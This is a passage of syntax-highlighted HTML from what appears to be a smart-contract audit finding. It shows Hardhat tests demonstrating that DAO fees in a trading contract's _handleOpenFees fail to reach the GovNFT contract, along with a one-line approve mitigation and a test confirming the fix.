class=\"mtk11\">withArgs</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;10000000000000000000&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">constants</span><span class=\"mtk1\">.</span><span class=\"mtk12\">AddressZero</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// another Governance NFT is minted to owner and then transferred to user after initiateMarketOrder function is called</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">govnft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">govnft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// user&#39;s pending reward amount should be 0 because her or his Governance NFT was minted after initiateMarketOrder function was called</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">govnft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pending</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// owner&#39;s Governance NFT was minted before initiateMarketOrder function was called so her or his pending reward amount should be 10000000000000000000.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// However, owner&#39;s pending reward amount is still 0 because DAO fees were not transferred to GovNFT contract successfully.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">govnft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pending</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span></code></pre>\n<p>Furthermore, as a suggested mitigation, please add <code>IStable(_tigAsset).approve(address(gov), type(uint).max);</code> in the <code>_handleOpenFees</code> function as follows in line 749 of <code>contracts\\Trading.sol</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"80\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">689</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_handleOpenFees</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">690:         </span><span class=\"mtk10\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_asset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">691:         </span><span class=\"mtk10\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_positionSize</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">692:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_trader</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">693:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_tigAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">694:         </span><span class=\"mtk10\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_isBot</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">695</span><span class=\"mtk1\">:     )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">696:         </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">697:         </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_feePaid</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">698:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">699</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">IPairsContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Asset</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">asset</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">pairsContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">idToAsset</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">732</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">733</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_daoFeesPaid</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_positionSize</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_fees</span><span class=\"mtk1\">.</span><span class=\"mtk12\">daoFees</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">734</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">_feePaid</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">735</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">_positionSize</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">736</span><span class=\"mtk1\">:                 * (</span><span class=\"mtk12\">_fees</span><span class=\"mtk1\">.</span><span class=\"mtk12\">burnFees</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_fees</span><span class=\"mtk1\">.</span><span class=\"mtk12\">botFees</span><span class=\"mtk1\">) </span><span class=\"mtk3\">// get total fee%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">737</span><span class=\"mtk1\">:</span><span class=\"mtk5\">                 / DIVISION_CONSTANT /</span><span class=\"mtk1\">/ </span><span class=\"mtk12\">divide</span><span class=\"mtk1\"> </span><span class=\"mtk12\">by</span><span class=\"mtk1\"> </span><span class=\"mtk7\">100</span><span class=\"mtk1\">%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">738</span><span class=\"mtk1\">:                 + </span><span class=\"mtk12\">_daoFeesPaid</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">739</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FeesDistributed</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">740</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">741</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">_daoFeesPaid</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">742</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">_positionSize</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_fees</span><span class=\"mtk1\">.</span><span class=\"mtk12\">burnFees</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">743</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">_referrer</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) ? </span><span class=\"mtk12\">_positionSize</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_fees</span><span class=\"mtk1\">.</span><span class=\"mtk12\">referralFees</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\"> : </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">744</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">_positionSize</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">_fees</span><span class=\"mtk1\">.</span><span class=\"mtk12\">botFees</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">745</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">_referrer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">746</span><span class=\"mtk1\">:             );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">747</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">IStable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mintFor</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_daoFeesPaid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">748</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">749</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">IStable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">gov</span><span class=\"mtk1\">), </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);   </span><span class=\"mtk3\">// @audit add this line of code for POC purpose</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">750</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">gov</span><span class=\"mtk1\">.</span><span class=\"mtk11\">distribute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">, </span><span class=\"mtk11\">IStable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">751</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>Then, as a comparison, the following test can be added in the <code>Signature verification</code> <code>describe</code> block in <code>test\\07.Trading.js</code>. This test will pass to demonstrate that the Governance NFT holder’s pending rewards is no longer 0 after implementing the suggested mitigation. Please see the comments in this test for more details.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"typescript\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">it</span><span class=\"mtk1\">.</span><span class=\"mtk11\">only</span><span class=\"mtk1\">(</span><span class=\"mtk8\">`If calling initiateMarketOrder function can correctly send DAO fees to GovNFT contract, Governance NFT holder, whose NFT was minted before initiateMarketOrder function is called,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">             can receive deserved rewards after initiateMarketOrder function is called`</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TradeInfo</span><span class=\"mtk1\"> = [</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;1000&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">MockDAI</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">StableVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;10&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;30000&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;10000&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">constants</span><span class=\"mtk1\">.</span><span class=\"mtk12\">HashZero</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PriceData</span><span class=\"mtk1\"> = [</span><span class=\"mtk12\">node</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;20000&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2000000000</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">message</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">.</span><span class=\"mtk12\">defaultAbiCoder</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          [</span><span class=\"mtk8\">&#39;address&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;bool&#39;</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          [</span><span class=\"mtk12\">node</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;20000&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2000000000</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sig</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">node</span><span class=\"mtk1\">.</span><span class=\"mtk11\">signMessage</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">Buffer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">from</span><span class=\"mtk1\">(</span><span class=\"mtk12\">message</span><span class=\"mtk1\">.</span><span class=\"mtk11\">substring</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&#39;hex&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PermitData</span><span class=\"mtk1\"> = [</span><span class=\"mtk12\">permitSig</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deadline</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">constants</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MaxUint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">permitSig</span><span class=\"mtk1\">.</span><span class=\"mtk12\">v</span><span class=\"mtk1\">, </span><span class=\"mtk12\">permitSig</span><span class=\"mtk1\">.</span><span class=\"mtk12\">r</span><span class=\"mtk1\">, </span><span class=\"mtk12\">permitSig</span><span class=\"mtk1\">.</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// one Governance NFT is minted to owner before initiateMarketOrder function is called</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deployments</span><span class=\"mtk1\">.</span><span class=\"mtk11\">get</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;GovNFT&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">govnft</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractAt</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;GovNFT&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">govnft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// calling initiateMarketOrder function attempts to send 10000000000000000000 tigAsset as DAO fees to GovNFT contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">trading</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">initiateMarketOrder</span><span class=\"mtk1\">(</span><span class=\"mtk12\">TradeInfo</span><span class=\"mtk1\">, </span><span class=\"mtk12\">PriceData</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sig</span><span class=\"mtk1\">, </span><span class=\"mtk12\">PermitData</span><span class=\"mtk1\">, </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        .</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">emit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">trading</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;FeesDistributed&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        .</span><span class=\"mtk11\">withArgs</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;10000000000000000000&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">constants</span><span class=\"mtk1\">.</span><span class=\"mtk12\">AddressZero</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// another Governance NFT is minted to owner and then transferred to user after initiateMarketOrder function is called</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">govnft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">govnft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// user&#39;s pending reward amount should be 0 because her or his Governance NFT was minted after initiateMarketOrder function was called</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">govnft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pending</span><span class=\"mtk1\">(</span><span class=\"mtk12\">user</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;0&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// If calling initiateMarketOrder function can correctly send DAO fees to GovNFT contract, owner&#39;s pending reward amount should be 10000000000000000000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">//   because her or his Governance NFT was minted before initiateMarketOrder function was called.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">govnft</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pending</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">stabletoken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;10000000000000000000&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    